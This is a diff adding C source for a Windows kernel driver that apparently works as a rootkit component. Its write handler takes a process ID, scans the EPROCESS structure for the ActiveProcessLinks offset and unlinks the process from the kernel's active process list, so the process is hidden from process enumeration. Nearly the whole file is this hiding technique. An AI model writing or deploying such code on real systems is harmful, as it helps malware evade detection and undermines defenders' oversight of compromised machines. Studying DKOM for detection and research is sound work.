@@ -1,0 +1,134 @@
+#include <ntifs.h>
+#include <ntddk.h>
+#include <ntstrsafe.h>
+
+#if defined(UNICODE)
+# define RtlStringCbPrintf RtlStringCbPrintfA
+#else
+# define RtlStringCbPrintf RtlStringCbPrintfW
+#endif
+
+UNICODE_STRING Autograph = RTL_CONSTANT_STRING(L"BASH"); // L because its a pointer to wchar_t
+UNICODE_STRING DeviceName; // = RTL_CONSTANT_STRING(L"\\Device\\DKOM_Driver");
+UNICODE_STRING dosDeviceName; // = RTL_CONSTANT_STRING(L"\\DosDevices\\DKOM_Driver");
+PDEVICE_OBJECT ptrDeviceObj;
+
+VOID Unload(PDRIVER_OBJECT pDriverObj)
+{
+	IoDeleteSymbolicLink(&dosDeviceName); // delete link netween dos name and NT name
+	IoDeleteDevice(pDriverObj->DeviceObject);
+}
+
+// thia is the "MJ_WRITE" method:
+NTSTATUS HideProcess(PDEVICE_OBJECT pDeviceObj, PIRP irp) // pointer to device object and pointer to irp (IO request packet)
+{
+	UNREFERENCED_PARAMETER(pDeviceObj);
+
+	irp->IoStatus.Information = 0; // if not successful
+	PVOID buffer = MmGetSystemAddressForMdlSafe(irp->MdlAddress, NormalPagePriority); // get non paged memory => this is the data passed with the request (pid)
+
+	if(!buffer)
+	{
+		irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
+		IoCompleteRequest(irp, IO_NO_INCREMENT);
+		return STATUS_INSUFFICIENT_RESOURCES;
+	}
+
+	DbgPrint("Process ID: %d", *(PHANDLE)buffer);
+
+	PEPROCESS Process;
+	NTSTATUS status = PsLookupProcessByProcessId(*(PHANDLE)buffer, &Process);
+	if(!NT_SUCCESS(status)) // if fails
+	{
+		DbgPrint("Error: Unable to open process object (%#x)", status);
+		irp->IoStatus.Status = status;
+		IoCompleteRequest(irp, IO_NO_INCREMENT);
+		return STATUS_INSUFFICIENT_RESOURCES;
+	}
+
+	DbgPrint("EPROCESS address: %#x", Process);
+	PULONG ptr = (PULONG)Process;
+
+	// Scan the EPROCESS structure for the PID
+	ULONG offset = 0;
+	PLIST_ENTRY CurrListEntry; //PrevListEntry, NextListEntry;
+	for(short i = 0; i < (short)512; i++)
+	{
+		if(ptr[i] == *((PULONG)buffer))
+		{
+			offset = (ULONG)&ptr[i + 1] - (ULONG)Process; // ActiveProcessLinks is located next to the PID
+			// after it will work try the next:
+			CurrListEntry = (PLIST_ENTRY)((PUCHAR)&ptr[i + 1]); //(PUCHAR)Process + (ULONG)&ptr[i + 1] - (ULONG)Process
+			DbgPrint("ActiveProcessLinks offset: %#x", offset);
+			break;
+		}
+	}
+
+	if(!offset) // not found
+	{
+		irp->IoStatus.Status = STATUS_UNSUCCESSFUL;
+		IoCompleteRequest(irp, IO_NO_INCREMENT);
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	CurrListEntry = (PLIST_ENTRY)((PUCHAR)Process + offset); // Get the ActiveProcessLinks address
+
+	// PrevListEntry = CurrListEntry->Blink;
+	// NextListEntry = CurrListEntry->Flink;
+	// Unlink the target process from other processes (unlink from list)
+	CurrListEntry->Blink->Flink = CurrListEntry->Flink; // point prevEPROCESS Flink to nextEPROCESS
+	CurrListEntry->Flink->Blink = CurrListEntry->Blink; // point nextEPROCESS Blink to prevEPROCESS
+
+	CurrListEntry->Flink = CurrListEntry; // Point Flink and Blink to self to prevent BSOD
+	CurrListEntry->Blink = CurrListEntry;
+
+	ObDereferenceObject(Process); // Dereference the target process -> decrease the reference counter
+
+	irp->IoStatus.Information = sizeof(HANDLE); // if successful there is information
+	irp->IoStatus.Status = STATUS_SUCCESS;
+
+	IoCompleteRequest(irp, IO_NO_INCREMENT);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS NotSupportedOperation(PDEVICE_OBJECT pDeviceObj, PIRP irp)
+{
+	UNREFERENCED_PARAMETER(pDeviceObj);
+
+	NTSTATUS NtStatus = STATUS_NOT_SUPPORTED;
+	DbgPrint("Not Supported Operation Called\n");
+	DbgPrint("not supported Major Function (%#x)\n", IoGetCurrentIrpStackLocation(irp)->MajorFunction);
+	WCHAR buff[50];
+	// the next method is like sprinf: RtlStringCbPrintf
+	if(!NT_SUCCESS(RtlStringCbPrintf(buff, 50 * sizeof(WCHAR), L"Major function: %lu\n", IoGetCurrentIrpStackLocation(irp)->MajorFunction))) // get major function code and cast to string
+		DbgPrint("Could not cast major function to string\n");
+	// sprintf(buff, "Major function: %lu\n", IoGetCurrentIrpStackLocation(irp)->MajorFunction); // get major function code and cast to string
+	DbgPrint(buff); // Dbgprint the above
+	return NtStatus;
+}
+
+NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryPath)
+{
+	//UNREFERENCED_PARAMETER(pDeviceObject);
+	UNREFERENCED_PARAMETER(pRegistryPath);
+
+	RtlInitUnicodeString(&DeviceName, L"\\Devices\\DKOM"); // copy unicode to string
+	RtlInitUnicodeString(&dosDeviceName, L"\\DosDevices\\DKOM");
+	
+	IoCreateDevice(pDriverObj, 0, &DeviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &ptrDeviceObj);
+	IoCreateSymbolicLink(&dosDeviceName, &DeviceName); // create symbolic link between the dos name and NT name in the object manager
+
+	pDriverObj->DriverUnload = Unload;
+
+	for(short i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
+	{
+		pDriverObj->MajorFunction[i] = NotSupportedOperation;
+	}
+
+	pDriverObj->MajorFunction[IRP_MJ_WRITE] = HideProcess;
+
+	ptrDeviceObj->Flags &= ~DO_DEVICE_INITIALIZING;
+	ptrDeviceObj->Flags |= DO_DIRECT_IO;
+
+	return STATUS_SUCCESS;
+}
